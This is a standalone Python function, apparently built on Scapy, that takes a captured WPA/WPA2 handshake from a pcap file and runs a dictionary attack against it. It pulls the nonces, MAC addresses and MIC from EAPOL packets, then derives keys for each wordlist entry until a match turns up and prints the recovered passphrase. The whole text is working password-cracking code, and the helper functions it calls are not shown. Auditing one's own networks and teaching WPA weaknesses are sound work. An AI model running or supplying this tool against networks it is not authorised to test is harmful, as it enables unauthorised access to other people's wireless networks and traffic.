def crack_handshake(ap_ssid, pcap, wordlist):
    packets = rdpcap(pcap)
    ssid = ap_ssid
    pke = b"Pairwise key expansion"

    # Ensure the packets contain the necessary layers
    eapol_packets = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
    if len(eapol_packets) < 2:
        print("Error: The provided pcap file does not contain at least 2 EAPOL packets.")
        return

    # Handle the case with more than two EAPOL packets
    ap_mac = eapol_packets[0].addr2.replace(':', '', 5)
    cl_mac = eapol_packets[0].addr1.replace(':', '', 5)
    mac_ap = binascii.unhexlify(ap_mac)
    mac_cl = binascii.unhexlify(cl_mac)
    
    # Extract ANonce and SNonce from the first two EAPOL packets
    anonce = eapol_packets[0][EAPOL].load[13:45]
    snonce = eapol_packets[1][EAPOL].load[13:45]

    # If there's a third packet, we can check for any further EAPOL layer info, but we still rely on the first two for key data.
    if len(eapol_packets) > 2:
        print(f"Warning: More than two EAPOL packets detected. The third packet might be part of a larger handshake.")

    key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)

    message_integrity_check = binascii.hexlify(eapol_packets[1][EAPOL].load)[154:186]

    wpa_data = binascii.hexlify(bytes(eapol_packets[1][EAPOL]))
    wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
    wpa_data = binascii.a2b_hex(wpa_data)

    print("Opening " + wordlist + "...")
    words = open(wordlist, 'r', encoding="ISO-8859-1")
    print("Crack in progress...")
    for psk in words.readlines():
        psk = psk.replace("\n", "")
        pairwise_master_key = calc_pmk(ssid, psk)
        pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data)
        mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()

        if mic[:-8] == message_integrity_check.decode():
            print("KEY FOUND! [ " + psk + " ]")
            print("Master Key: " + pairwise_master_key.hex())
            print("Transient Key: " + pairwise_transient_key.hex())
            print("EAPOL HMAC: " + message_integrity_check.decode())
            print("\nYou got it! Have a good day :)")
            exit(0)
    print("KEY NOT FOUND...")
    exit(1)
